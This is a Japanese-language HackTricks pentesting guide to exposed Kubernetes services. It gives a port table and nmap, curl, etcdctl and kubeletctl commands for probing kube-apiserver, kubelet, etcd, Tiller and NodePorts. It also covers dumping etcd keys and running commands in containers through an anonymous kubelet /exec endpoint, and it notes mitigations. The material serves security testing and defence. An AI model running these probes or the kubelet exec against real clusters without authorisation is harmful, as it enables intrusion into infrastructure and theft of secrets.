# Pentesting Kubernetes Services

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

Kubernetesは、**インターネットに公開されている**か、**一つのポッドが侵害された後の内部ネットワーク**で見つけることができるいくつかの**特定のネットワークサービス**を使用します。

## OSINTを使って公開されているポッドを見つける

一つの方法は、[crt.sh](https://crt.sh)で`Identity LIKE "k8s.%.com"`を検索して、kubernetesに関連するサブドメインを見つけることです。別の方法は、githubで`"k8s.%.com"`を検索し、その文字列を含む**YAMLファイル**を探すことです。

## Kubernetesがサービスを公開する方法

Kubernetesがどのようにサービスを**公に公開する**かを理解することが、それらを見つけるために役立つかもしれません：

{% content-ref url="../exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](../exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## ポートスキャンを通じて公開されているポッドを見つける

以下のポートがKubernetesクラスターで開いている可能性があります：

| ポート             | プロセス           | 説明                                       |
| --------------- | -------------- | ---------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes APIポート                        |
| 2379/TCP        | etcd           |                                          |
| 6666/TCP        | etcd           | etcd                                     |
| 4194/TCP        | cAdvisor       | コンテナメトリクス                                |
| 6443/TCP        | kube-apiserver | Kubernetes APIポート                        |
| 8443/TCP        | kube-apiserver | Minikube APIポート                          |
| 8080/TCP        | kube-apiserver | セキュアでないAPIポート                            |
| 10250/TCP       | kubelet        | フルモードアクセスを許可するHTTPS API                  |
| 10255/TCP       | kubelet        | 認証されていない読み取り専用HTTPポート：ポッド、実行中のポッド、ノードの状態 |
| 10256/TCP       | kube-proxy     | Kube Proxyヘルスチェックサーバー                    |
| 9099/TCP        | calico-felix   | Calicoのヘルスチェックサーバー                       |
| 6782-4/TCP      | weave          | メトリクスとエンドポイント                            |
| 30000-32767/TCP | NodePort       | サービスへのプロキシ                               |
| 44134/TCP       | Tiller         | Helmサービスのリスニング                           |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

これは、管理者が通常\*\*`kubectl`**ツールを使用して話す**API Kubernetesサービス\*\*です。

**一般的なポート: 6443と443**、しかしminikubeでは8443、不安全な場合は8080も。

```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```

**このサービスを利用して機密データを取得し、機密アクションを実行する方法については、以下のページを参照してください：**

{% content-ref url="../kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](../kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

このサービスは**クラスターの各ノードで実行されます**。**ノード**内のポッドを**制御**するサービスです。**kube-apiserver**と通信します。

このサービスが露出している場合、**認証されていないRCE**を見つけた可能性があります。

#### Kubelet API

```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```

```markdown
認証が必要な場合、レスポンスは `Unauthorized` となります。

ノードのリストを取得できる場合、以下のコマンドでkubeletsのエンドポイントのリストを取得できます:
```

```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```

#### kubelet（読み取り専用）

```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```

### etcd API

```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```

### Tiller

```
helm --host tiller-deploy.kube-system:44134 version
```

### cAdvisor

メトリクスを収集するために役立つサービスです。

```
curl -k https://<IP Address>:4194
```

### NodePort

**NodePort** を使用してポートがすべてのノードで公開されると、宣言された **Service** にトラフィックをプロキシするために、すべてのノードで同じポートが開かれます。デフォルトでは、このポートは **範囲 30000-32767** にあります。したがって、新しくチェックされていないサービスは、これらのポートを通じてアクセス可能になるかもしれません。

```
sudo nmap -sS -p 30000-32767 <IP>
```

## 脆弱なミスコンフィギュレーション

### Kube-apiserver 匿名アクセス

**kube-apiserver API エンドポイントへの匿名アクセスは許可されていません**。しかし、いくつかのエンドポイントをチェックすることができます：

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **ETCD 匿名アクセスのチェック**

ETCD はクラスタのシークレット、設定ファイル、その他の**機密データ**を保存します。**デフォルト**では、ETCD は**匿名で**アクセス**できません**が、チェックすることは常に良いです。

ETCD が匿名でアクセス可能な場合、[**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) **ツール**を**使用する**必要があるかもしれません。以下のコマンドで保存されているすべてのキーを取得します：

```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```

### **Kubelet RCE**

[Kubeletのドキュメント](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)によると、**デフォルトでは匿名アクセス**がサービスに**許可されています:**

> Kubeletサーバーへの匿名リクエストを有効にします。他の認証方法によって拒否されないリクエストは匿名リクエストとして扱われます。匿名リクエストは、ユーザー名が`system:anonymous`、グループ名が`system:unauthenticated`です。

**Kubelet APIの認証と承認の仕組み**をよりよく理解するには、このページを確認してください:

{% content-ref url="kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet**サービス**APIは文書化されていません**が、ソースコードはここで見つけることができ、公開されているエンドポイントを見つけるのは**実行するのと同じくらい簡単です**:

```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```

以下が興味深い内容です。

[Kubeletctl](https://github.com/cyberark/kubeletctl) ツールを使用して、Kubeletとそのエンドポイントと対話できます。

#### /pods

このエンドポイントはポッドとそのコンテナをリストします：

```bash
kubeletctl pods
```

#### /exec

このエンドポイントは、任意のコンテナ内でコードを非常に簡単に実行することを可能にします：

```bash
kubeletctl exec [command]
```

{% hint style="info" %}
この攻撃を避けるためには、_**kubelet**_ サービスを `--anonymous-auth false` で実行し、ネットワークレベルでサービスを隔離する必要があります。
{% endhint %}

### **Kubelet（読み取り専用ポート）の情報漏洩の確認**

**kubeletの読み取り専用ポート**が露出している場合、攻撃者はAPIから情報を取得できます。これにより、**ポッドの名前、内部ファイルの場所、その他の設定などのクラスター構成要素**が露出します。これは重要な情報ではありませんが、インターネットに露出すべきではありません。

例えば、リモート攻撃者は以下のURLにアクセスすることでこれを悪用できます： `http://<external-IP>:10255/pods`

![](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## 参考文献

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSのハッキングをゼロからヒーローになる方法を学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
